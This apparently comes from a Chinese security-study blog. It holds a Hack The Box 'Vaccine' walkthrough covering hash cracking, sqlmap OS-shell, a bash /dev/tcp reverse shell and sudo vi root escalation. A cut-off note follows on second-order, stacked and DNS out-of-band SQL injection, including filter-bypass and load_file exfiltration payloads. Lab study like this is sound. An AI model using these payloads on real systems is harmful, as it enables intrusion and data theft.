02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip$::backup.zip:style.css, index.php:backup.zip Now, we will type the following command: john -wordlist=/usr/share/wordlists/rockyou.txt hashesSo it will load the wordlist &amp; it will do a bruteforce attack against the hash stored in file hashes . Once the password is cracked, we will use the –show option to display the cracked password. 12345678910111213141516┌──(root㉿kali)-[/home/kali/Desktop]└─# john -wordlist=/usr/share/wordlists/rockyou.txt hashesUsing default input encoding: UTF-8Loaded 1 password hash (PKZIP [32/64])Will run 4 OpenMP threadsPress &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status741852963 (backup.zip) 1g 0:00:00:00 DONE (2023-07-24 02:40) 33.33g/s 273066p/s 273066c/s 273066C/s 123456..whitetigerUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed. ┌──(root㉿kali)-[/home/kali/Desktop]└─# john --show hashes backup.zip:741852963::backup.zip:style.css, index.php:backup.zip1 password hash cracked, 0 left 得到密码：741852963，解压 123456┌──(root㉿kali)-[/home/kali/Desktop]└─# unzip backup.zipArchive: backup.zip[backup.zip] index.php password: inflating: index.php inflating: style.css index.php里是什么： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253┌──(root㉿kali)-[/home/kali/Desktop]└─# cat index.php &lt;!DOCTYPE html&gt;&lt;?phpsession_start(); if(isset($_POST[&#x27;username&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;])) &#123; if($_POST[&#x27;username&#x27;] === &#x27;admin&#x27; &amp;&amp; md5($_POST[&#x27;password&#x27;]) === &quot;2cb42f8734ea607eefed3b70af13bbd3&quot;) &#123; $_SESSION[&#x27;login&#x27;] = &quot;true&quot;; header(&quot;Location: dashboard.php&quot;); &#125; &#125;?&gt;&lt;html lang=&quot;en&quot; &gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;MegaCorp Login&lt;/title&gt; &lt;link href=&quot;https://fonts.googleapis.com/css?family=Open+Sans:400,700&quot; rel=&quot;stylesheet&quot;&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;./style.css&quot;&gt;&lt;/head&gt; &lt;h1 align=center&gt;MegaCorp Login&lt;/h1&gt;&lt;body&gt;&lt;!-- partial:index.partial.html --&gt;&lt;body class=&quot;align&quot;&gt; &lt;div class=&quot;grid&quot;&gt; &lt;form action=&quot;&quot; method=&quot;POST&quot; class=&quot;form login&quot;&gt; &lt;div class=&quot;form__field&quot;&gt; &lt;label for=&quot;login__username&quot;&gt;&lt;svg class=&quot;icon&quot;&gt;&lt;use xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;#user&quot;&gt;&lt;/use&gt;&lt;/svg&gt;&lt;span class=&quot;hidden&quot;&gt;Username&lt;/span&gt;&lt;/label&gt; &lt;input id=&quot;login__username&quot; type=&quot;text&quot; name=&quot;username&quot; class=&quot;form__input&quot; placeholder=&quot;Username&quot; required&gt; &lt;/div&gt; &lt;div class=&quot;form__field&quot;&gt; &lt;label for=&quot;login__password&quot;&gt;&lt;svg class=&quot;icon&quot;&gt;&lt;use xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;#lock&quot;&gt;&lt;/use&gt;&lt;/svg&gt;&lt;span class=&quot;hidden&quot;&gt;Password&lt;/span&gt;&lt;/label&gt; &lt;input id=&quot;login__password&quot; type=&quot;password&quot; name=&quot;password&quot; class=&quot;form__input&quot; placeholder=&quot;Password&quot; required&gt; &lt;/div&gt; &lt;div class=&quot;form__field&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Sign In&quot;&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; class=&quot;icons&quot;&gt;&lt;symbol id=&quot;arrow-right&quot; viewBox=&quot;0 0 1792 1792&quot;&gt;&lt;path d=&quot;M1600 960q0 54-37 91l-651 651q-39 37-91 37-51 0-90-37l-75-75q-38-38-38-91t38-91l293-293H245q-52 0-84.5-37.5T128 1024V896q0-53 32.5-90.5T245 768h704L656 474q-38-36-38-90t38-90l75-75q38-38 90-38 53 0 91 38l651 651q37 35 37 90z&quot;/&gt;&lt;/symbol&gt;&lt;symbol id=&quot;lock&quot; viewBox=&quot;0 0 1792 1792&quot;&gt;&lt;path d=&quot;M640 768h512V576q0-106-75-181t-181-75-181 75-75 181v192zm832 96v576q0 40-28 68t-68 28H416q-40 0-68-28t-28-68V864q0-40 28-68t68-28h32V576q0-184 132-316t316-132 316 132 132 316v192h32q40 0 68 28t28 68z&quot;/&gt;&lt;/symbol&gt;&lt;symbol id=&quot;user&quot; viewBox=&quot;0 0 1792 1792&quot;&gt;&lt;path d=&quot;M1600 1405q0 120-73 189.5t-194 69.5H459q-121 0-194-69.5T192 1405q0-53 3.5-103.5t14-109T236 1084t43-97.5 62-81 85.5-53.5T538 832q9 0 42 21.5t74.5 48 108 48T896 971t133.5-21.5 108-48 74.5-48 42-21.5q61 0 111.5 20t85.5 53.5 62 81 43 97.5 26.5 108.5 14 109 3.5 103.5zm-320-893q0 159-112.5 271.5T896 896 624.5 783.5 512 512t112.5-271.5T896 128t271.5 112.5T1280 512z&quot;/&gt;&lt;/symbol&gt;&lt;/svg&gt;&lt;/body&gt;&lt;!-- partial --&gt;&lt;/body&gt;&lt;/html&gt; 发现这行： $_POST[&#39;username&#39;] === &#39;admin&#39; &amp;&amp; md5($_POST[&#39;password&#39;]) === &quot;2cb42f8734ea607eefed3b70af13bbd3&quot; username: admin password: 2cb42f8734ea607eefed3b70af13bbd3 根据php语句，密码是md5加密后的数据 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788┌──(root㉿kali)-[/home/kali/Desktop]└─# hashid 2cb42f8734ea607eefed3b70af13bbd3Analyzing &#x27;2cb42f8734ea607eefed3b70af13bbd3&#x27;[+] MD2 [+] MD5 [+] MD4 [+] Double MD5 [+] LM [+] RIPEMD-128 [+] Haval-128 [+] Tiger-128 [+] Skein-256(128) [+] Skein-512(128) [+] Lotus Notes/Domino 5 [+] Skype [+] Snefru-128 [+] NTLM [+] Domain Cached Credentials [+] Domain Cached Credentials 2 [+] DNSSEC(NSEC3) [+] RAdmin v2.x ┌──(root㉿kali)-[/home/kali/Desktop]└─# echo &#x27;2cb42f8734ea607eefed3b70af13bbd3&#x27; &gt; hash ┌──(root㉿kali)-[/home/kali/Desktop]└─# hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) startingOpenCL API (OpenCL 3.0 PoCL 3.1+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]==================================================================================================================================================* Device #1: pthread-penryn-Intel(R) Celeron(R) N5095 @ 2.00GHz, 1433/2930 MB (512 MB allocatable), 4MCUMinimum password length supported by kernel: 0Maximum password length supported by kernel: 256Hashes: 1 digests; 1 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Optimizers applied:* Zero-Byte* Early-Skip* Not-Salted* Not-Iterated* Single-Hash* Single-Salt* Raw-HashATTENTION! Pure (unoptimized) backend kernels selected.Pure kernels can crack longer passwords, but drastically reduce performance.If you want to switch to optimized kernels, append -O to your commandline.See the above message to find out about the exact limits.Watchdog: Temperature abort trigger set to 90cHost memory required for this attack: 0 MBDictionary cache building /usr/share/wordlists/rockyou.txt: 33553434 bytes (23.98Dictionary cache building /usr/share/wordlists/rockyou.txt: 67106869 bytes (47.96Dictionary cache building /usr/share/wordlists/rockyou.txt: 134213744 bytes (95.9Dictionary cache built:* Filename..: /usr/share/wordlists/rockyou.txt* Passwords.: 14344392* Bytes.....: 139921507* Keyspace..: 14344385* Runtime...: 2 secs2cb42f8734ea607eefed3b70af13bbd3:qwerty789 Session..........: hashcatStatus...........: CrackedHash.Mode........: 0 (MD5)Hash.Target......: 2cb42f8734ea607eefed3b70af13bbd3Time.Started.....: Mon Jul 24 03:30:25 2023 (0 secs)Time.Estimated...: Mon Jul 24 03:30:25 2023 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........: 387.5 kH/s (0.18ms) @ Accel:256 Loops:1 Thr:1 Vec:4Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)Progress.........: 100352/14344385 (0.70%)Rejected.........: 0/100352 (0.00%)Restore.Point....: 99328/14344385 (0.69%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device GeneratorCandidates.#1....: 020180 -&gt; paashaasHardware.Mon.#1..: Util: 14%Started: Mon Jul 24 03:29:30 2023Stopped: Mon Jul 24 03:30:26 2023 得到结果：qwerty789 因为80端口的缘故浏览器登录： ![Untitled](D:\\Study\\security\\Vaccine cb9391dba556416cae0ccf2691de612f\\Untitled.png) sqlmap使用，在46课也有详细讲解 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192┌──(root㉿kali)-[/home/kali/Desktop]└─# sqlmap -h ___ __H__ ___ ___[,]_____ ___ ___ &#123;1.7.2#stable&#125; |_ -| . [&#x27;] | .&#x27;| . | |___|_ [&#x27;]_|_|_|__,| _| |_|V... |_| https://sqlmap.org Usage: python3 sqlmap [options]Options: -h, --help Show basic help message and exit -hh Show advanced help message and exit --version Show program&#x27;s version number and exit -v VERBOSE Verbosity level: 0-6 (default 1) Target: At least one of these options has to be provided to define the target(s) -u URL, --url=URL Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;) -g GOOGLEDORK Process Google dork results as target URLs Request: These options can be used to specify how to connect to the target URL --data=DATA Data string to be sent through POST (e.g. &quot;id=1&quot;) --cookie=COOKIE HTTP Cookie header value (e.g. &quot;PHPSESSID=a8d127e..&quot;) --random-agent Use randomly selected HTTP User-Agent header value --proxy=PROXY Use a proxy to connect to the target URL --tor Use Tor anonymity network --check-tor Check to see if Tor is used properly Injection: These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts -p TESTPARAMETER Testable parameter(s) --dbms=DBMS Force back-end DBMS to provided value Detection: These options can be used to customize the detection phase --level=LEVEL Level of tests to perform (1-5, default 1) --risk=RISK Risk of tests to perform (1-3, default 1) Techniques: These options can be used to tweak testing of specific SQL injection techniques --technique=TECH.. SQL injection techniques to use (default &quot;BEUSTQ&quot;) Enumeration: These options can be used to enumerate the back-end database management system information, structure and data contained in the tables -a, --all Retrieve everything -b, --banner Retrieve DBMS banner --current-user Retrieve DBMS current user --current-db Retrieve DBMS current database --passwords Enumerate DBMS users password hashes --dbs Enumerate DBMS databases --tables Enumerate DBMS database tables --columns Enumerate DBMS database table columns --schema Enumerate DBMS schema --dump Dump DBMS database table entries --dump-all Dump all DBMS databases tables entries -D DB DBMS database to enumerate -T TBL DBMS database table(s) to enumerate -C COL DBMS database table column(s) to enumerate Operating system access: These options can be used to access the back-end database management system underlying operating system --os-shell Prompt for an interactive operating system shell --os-pwn Prompt for an OOB shell, Meterpreter or VNC General: These options can be used to set some general working parameters --batch Never ask for user input, use the default behavior --flush-session Flush session files for current target Miscellaneous: These options do not fit into any other category --wizard Simple wizard interface for beginner users[!] to see full list of options run with &#x27;-hh&#x27; 因cookie身份认证问题， 需下载插件，cookie编辑器： 🔒 For Google: [https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm](https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm) For Firefox: [https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/) ![Untitled](D:\\Study\\security\\Vaccine cb9391dba556416cae0ccf2691de612f\\Untitled 1.png) 啊反复了几次，这次终于拿到了： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768┌──(root㉿kali)-[/home/kali/Desktop]└─# sqlmap -u &#x27;http://10.129.103.172/dashboard.php?search=any+query&#x27; --cookie=&quot;PHPSESSID=k3e94885qhta9s4sqqskebljqq&quot; --os-shell ___ __H__ ___ ___[&#x27;]_____ ___ ___ &#123;1.7.2#stable&#125; |_ -| . [&quot;] | .&#x27;| . | |___|_ [&#x27;]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 04:51:12 /2023-07-24/[04:51:12] [INFO] testing connection to the target URL[04:51:20] [INFO] checking if the target is protected by some kind of WAF/IPS[04:51:21] [INFO] testing if the target URL content is stable[04:51:21] [INFO] target URL content is stable[04:51:21] [INFO] testing if GET parameter &#x27;search&#x27; is dynamic[04:51:21] [WARNING] GET parameter &#x27;search&#x27; does not appear to be dynamic[04:51:22] [INFO] heuristic (basic) test shows that GET parameter &#x27;search&#x27; might be injectable (possible DBMS: &#x27;PostgreSQL&#x27;)[04:51:23] [INFO] testing for SQL injection on GET parameter &#x27;search&#x27;it looks like the back-end DBMS is &#x27;PostgreSQL&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] yfor the remaining tests, do you want to include all tests for &#x27;PostgreSQL&#x27; extending provided level (1) and risk (1) values? [Y/n] y[04:51:58] [INFO] testing &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;[04:52:03] [INFO] testing &#x27;Boolean-based blind - Parameter replace (original value)&#x27; [04:52:04] [INFO] testing &#x27;Generic inline queries&#x27;[04:52:04] [INFO] testing &#x27;PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)&#x27; [04:52:07] [INFO] GET parameter &#x27;search&#x27; appears to be &#x27;PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)&#x27; injectable [04:52:07] [INFO] testing &#x27;PostgreSQL AND error-based - WHERE or HAVING clause&#x27;[04:52:08] [INFO] GET parameter &#x27;search&#x27; is &#x27;PostgreSQL AND error-based - WHERE or HAVING clause&#x27; injectable [04:52:08] [INFO] testing &#x27;PostgreSQL inline queries&#x27;[04:52:08] [INFO] testing &#x27;PostgreSQL &gt; 8.1 stacked queries (comment)&#x27;[04:52:08] [WARNING] time-based comparison requires larger statistical model, please wait..... (done)[04:52:21] [INFO] GET parameter &#x27;search&#x27; appears to be &#x27;PostgreSQL &gt; 8.1 stacked queries (comment)&#x27; injectable [04:52:21] [INFO] testing &#x27;PostgreSQL &gt; 8.1 AND time-based blind&#x27;[04:52:32] [INFO] GET parameter &#x27;search&#x27; appears to be &#x27;PostgreSQL &gt; 8.1 AND time-based blind&#x27; injectable [04:52:32] [INFO] testing &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;GET parameter &#x27;search&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:---Parameter: search (GET) Type: boolean-based blind Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST) Payload: search=any query&#x27; AND (SELECT (CASE WHEN (6093=6093) THEN NULL ELSE CAST((CHR(118)||CHR(118)||CHR(87)||CHR(105)) AS NUMERIC) END)) IS NULL-- RTIw Type: error-based Title: PostgreSQL AND error-based - WHERE or HAVING clause Payload: search=any query&#x27; AND 9369=CAST((CHR(113)||CHR(118)||CHR(98)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (9369=9369) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(98)||CHR(122)||CHR(113)) AS NUMERIC)-- fmXN Type: stacked queries Title: PostgreSQL &gt; 8.1 stacked queries (comment) Payload: search=any query&#x27;;SELECT PG_SLEEP(5)-- Type: time-based blind Title: PostgreSQL &gt; 8.1 AND time-based blind Payload: search=any query&#x27; AND 5884=(SELECT 5884 FROM PG_SLEEP(5))-- LLsP---[04:52:37] [INFO] the back-end DBMS is PostgreSQLweb server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (focal or eoan)web application technology: Apache 2.4.41back-end DBMS: PostgreSQL[04:52:40] [INFO] fingerprinting the back-end DBMS operating system[04:52:49] [INFO] the back-end DBMS operating system is Linux[04:52:50] [INFO] testing if current user is DBA[04:52:59] [INFO] retrieved: &#x27;1&#x27;[04:53:00] [INFO] going to use &#x27;COPY ... FROM PROGRAM ...&#x27; command execution[04:53:00] [INFO] calling Linux OS shell. To quit type &#x27;x&#x27; or &#x27;q&#x27; and press ENTERos-shell&gt; bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.221/1234 0&gt;&amp;1&quot; shan，终于连回来了： 1234567┌──(root㉿kali)-[/home/kali]└─# nc -lnvp 1234listening on [any] 1234 ...connect to [10.10.14.54] from (UNKNOWN) [10.129.103.172] 41906bash: cannot set terminal process group (7060): Inappropriate ioctl for devicebash: no job control in this shellpostgres@vaccine:/var/lib/postgresql/11/main$ 用nc拿到外壳后还不能TAB按键补全，使用以下命令获得完全交互式： 12345python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;CTRL+Zstty raw -echofgexport TERM=xterm 翻目录可以找到user的flag： 1234567postgres@vaccine:/var/lib/postgresql/11/main$ lspostgres@vaccine:/var/lib/postgresql/11/main$ cd ..postgres@vaccine:/var/lib/postgresql/11$ lsmainpostgres@vaccine:/var/lib/postgresql/11$ cd ..postgres@vaccine:/var/lib/postgresql$ ls11 user.txt 123456789101112postgres@vaccine:/var/lib/postgresql$ cd /var/www/htmlpostgres@vaccine:/var/www/html$ ls -latotal 392drwxr-xr-x 2 root root 4096 Jul 23 2021 .drwxr-xr-x 3 root root 4096 Jul 23 2021 ..-rw-rw-r-- 1 root root 362847 Feb 3 2020 bg.png-rw-r--r-- 1 root root 4723 Feb 3 2020 dashboard.css-rw-r--r-- 1 root root 50 Jan 30 2020 dashboard.js-rw-r--r-- 1 root root 2313 Feb 4 2020 dashboard.php-rw-r--r-- 1 root root 2594 Feb 3 2020 index.php-rw-r--r-- 1 root root 1100 Jan 30 2020 license.txt-rw-r--r-- 1 root root 3274 Feb 3 2020 style.css 文件dashboard.php： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102postgres@vaccine:/var/www/html$ cat dashboard.php&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; &gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Admin Dashboard&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./dashboard.css&quot;&gt; &lt;script src=&quot;https://use.fontawesome.com/33a3739634.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;!-- partial:index.partial.html --&gt;&lt;body&gt; &lt;div id=&quot;wrapper&quot;&gt; &lt;div class=&quot;parent&quot;&gt; &lt;h1 align=&quot;left&quot;&gt;MegaCorp Car Catalogue&lt;/h1&gt;&lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;&lt;div class=&quot;search-box&quot;&gt; &lt;input type=&quot;search&quot; name=&quot;search&quot; placeholder=&quot;Search&quot; /&gt; &lt;button type=&quot;submit&quot; class=&quot;search-btn&quot;&gt;&lt;i class=&quot;fa fa-search&quot;&gt;&lt;/i&gt;&lt;/button&gt;&lt;/div&gt;&lt;/form&gt; &lt;/div&gt; &lt;table id=&quot;keywords&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;&lt;span style=&quot;color: white&quot;&gt;Name&lt;/span&gt;&lt;/th&gt; &lt;th&gt;&lt;span style=&quot;color: white&quot;&gt;Type&lt;/span&gt;&lt;/th&gt; &lt;th&gt;&lt;span style=&quot;color: white&quot;&gt;Fuel&lt;/span&gt;&lt;/th&gt; &lt;th&gt;&lt;span style=&quot;color: white&quot;&gt;Engine&lt;/span&gt;&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;?php session_start(); if($_SESSION[&#x27;login&#x27;] !== &quot;true&quot;) &#123; header(&quot;Location: index.php&quot;); die(); &#125; try &#123; $conn = pg_connect(&quot;host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!&quot;); &#125; catch ( exception $e ) &#123; echo $e-&gt;getMessage(); &#125; if(isset($_REQUEST[&#x27;search&#x27;])) &#123; $q = &quot;Select * from cars where name ilike &#x27;%&quot;. $_REQUEST[&quot;search&quot;] .&quot;%&#x27;&quot;; $result = pg_query($conn,$q); if (!$result) &#123; die(pg_last_error($conn)); &#125; while($row = pg_fetch_array($result, NULL, PGSQL_NUM)) &#123; echo &quot; &lt;tr&gt; &lt;td class=&#x27;lalign&#x27;&gt;$row[1]&lt;/td&gt; &lt;td&gt;$row[2]&lt;/td&gt; &lt;td&gt;$row[3]&lt;/td&gt; &lt;td&gt;$row[4]&lt;/td&gt; &lt;/tr&gt;&quot;; &#125; &#125; else &#123; $q = &quot;Select * from cars&quot;; $result = pg_query($conn,$q); if (!$result) &#123; die(pg_last_error($conn)); &#125; while($row = pg_fetch_array($result, NULL, PGSQL_NUM)) &#123; echo &quot; &lt;tr&gt; &lt;td class=&#x27;lalign&#x27;&gt;$row[1]&lt;/td&gt; &lt;td&gt;$row[2]&lt;/td&gt; &lt;td&gt;$row[3]&lt;/td&gt; &lt;td&gt;$row[4]&lt;/td&gt; &lt;/tr&gt;&quot;; &#125; &#125; ?&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;/div&gt; &lt;/body&gt;&lt;!-- partial --&gt; &lt;script src=&#x27;https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js&#x27;&gt;&lt;/script&gt;&lt;script src=&#x27;https://cdnjs.cloudflare.com/ajax/libs/jquery.tablesorter/2.28.14/js/jquery.tablesorter.min.js&#x27;&gt;&lt;/script&gt;&lt;script src=&quot;./dashboard.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 发现代码中的这行：$conn = pg_connect(&quot;host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!&quot;); 用户密码就都有了。 shell可能会忽然死，改用ssh连接： 123456789101112131415161718192021222324252627282930313233┌──(kali㉿kali)-[~]└─$ ssh postgres@10.129.99.79The authenticity of host &#x27;10.129.99.79 (10.129.99.79)&#x27; can&#x27;t be established.ED25519 key fingerprint is SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#x27;10.129.99.79&#x27; (ED25519) to the list of known hosts.postgres@10.129.99.79&#x27;s password: Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon 24 Jul 2023 01:03:52 PM UTC System load: 0.0 Processes: 186 Usage of /: 32.6% of 8.73GB Users logged in: 0 Memory usage: 19% IP address for ens160: 10.129.99.79 Swap usage: 0%0 updates can be installed immediately.0 of these updates are security updates.The list of available updates is more than a week old.To check for new updates run: sudo apt updateThe programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law. sudo - l查看有哪些特权： 12345678910postgres@vaccine:~$ sudo -l[sudo] password for postgres: Matching Defaults entries for postgres on vaccine: env_keep+=&quot;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&quot;, env_keep+=&quot;XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH&quot;, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, mail_badpassUser postgres may run the following commands on vaccine: (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf vi sudo教学连接：https://gtfobins.github.io/gtfobins/vi/#sudo 123postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf -c &#x27;:!/bin/sh&#x27;/dev/nullSorry, user postgres is not allowed to execute &#x27;/bin/vi/etc/postgresql/11/main/pg_hba.conf -c :!/bin/sh /dev/null&#x27; as root on vaccine. 最后使用这两个命令还真拿到权限了： 123456789postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf#输入 :set shell=/bin/shpostgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf#输入 :shellroot@vaccine:/var/lib/postgresql# whoamirootroot@vaccine:/var/lib/postgresql# iduid=0(root) gid=0(root) groups=0(root) 123456root@vaccine:/var/lib/postgresql# cd /rootroot@vaccine:~# bashroot@vaccine:~# lspg_hba.conf root.txt snaproot@vaccine:~# cat root.txtdd6e058e814260bc70e9bbdef2715849","tags":["HTB","笔记","STARTING POINT"],"categories":["Range","HTB"]},{"title":"第45天：WEB攻防-PHP应用&SQL二次注入&堆叠执行&DNS带外&功能点&黑白盒条件","path":"/2023/07/22/xiaodi8/web/web攻防笔记第45天/","content":"PHP-MYSQL-二次注入-DEMO&amp;74CMS1、DEMO-用户注册登录修改密码①未登录前修改 ②登录后的修改-修改过程直接验证旧密码和接受新密码 一般他会要你输入你的用户名吗？不需要 用户名从哪里来？ 获取当前你登录的用户名当作修改条件 update users set password=&#39;a123456&#39; where username=&#39;killmen&#39; killmen’ and updatexml()…. 如果源码里面有转义：前加’后加#是没用的，会报错，插入不进去 二次注入的条件①必须要有这一句：$username = addslashes($_POST[&#39;username&#39;]);(这句本是防止普通单独注入) ②有先插入后利用的功能 二次注入通常是在白盒下审计代码申出来的，黑盒未知代码则很难测试 2、CMS-74CMS个人中心简历功能黑盒思路：分析功能有添加后对数据操作的地方（功能点） 白盒思路：insert后进入select或update的功能的代码块 注入条件：插入时有转义函数或配置，后续有利用插入的数据 PHP-MYSQL-堆叠注入-DEMO&amp;CTF强网堆叠注入触发的条件很苛刻，因为堆叠注入原理就是通过结束符同时执行多条sql语句， 例如php中的mysqli_multi_query函数。与之相对应的mysqli_query()只能执行一条SQL，所以要想目标存在堆叠注入，在目标主机存在类似于mysqli_multi_query()这样的函数，根据数据库类型决定是否支持多条语句执行。 堆叠注入条件1、目标存在sql注入漏洞 2、目标未对”;“号进行过滤 3、目标中间层查询数据库信息时可同时执行多条sql语句 支持堆叠数据库：MYSQL MSSQL Postgresql等 2019强网杯-随便注（CTF题型）堆叠注入和二次注入喜欢在CTF里考，真实就是看白盒审计 12345678910&#x27;;show databases;&#x27;;show tables;&#x27;;show columns from `1919810931114514`;&#x27;;select flag from `1919810931114514`;#有时候过滤了select等关键字，可用以下方法：利用变量把查询语句加密后赋值到SeT里&#x27;;SeT @a=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql; PHP-MYSQL-带外注入-DEMO&amp;DNSLOG太花里胡哨了，面试题会问，实战没有哦，有高权限还load_file()，整那么多没用的带外干啥 0.注入条件**ROOT高权限且支持load_file()**【打开控制安全文件开关：secure-file-priv=】 有部分注入点是没有回显的，所有读取也是没回显的，采用带外 1.使用平台http://ceye.io http://www.dnslog.cn 2.带外应用场景解决不回显，反向连接，SQL注入，命令执行，SSRF等 SQL注入： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061select load_file(concat(&#x27;\\\\\\\\&#x27;,(select database()),&#x27;.7logee.dnslog.cn\\\\aa&#x27;));and (select load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.69knl9.dnslog.cn/abc&#x27;)))// 查询当前数据库id=1 and load_file(concat(&quot;\\\\\\\\&quot;,database(),&quot;.dbuh8a.ceye.io\\\\asdt&quot;))//查询其他数据库id=1 and load_file(concat(&quot;\\\\\\\\&quot;,(select schema_name from information_schema.schemata limit 0,1),&quot;.dbuh8a.ceye.io\\\\xxx.txt&quot;))&quot;&quot;&quot;由于该DNS记录只能回显一个字段，所以因该使用limit，第一个参数是查询起始位置，第二个参数是查询个数limit 0,1 查询第一个数据库名limit 1,1 查询第二个数据库名limit 2,1 查询第三个数据库名&quot;&quot;&quot;//查询版本号id=1 and 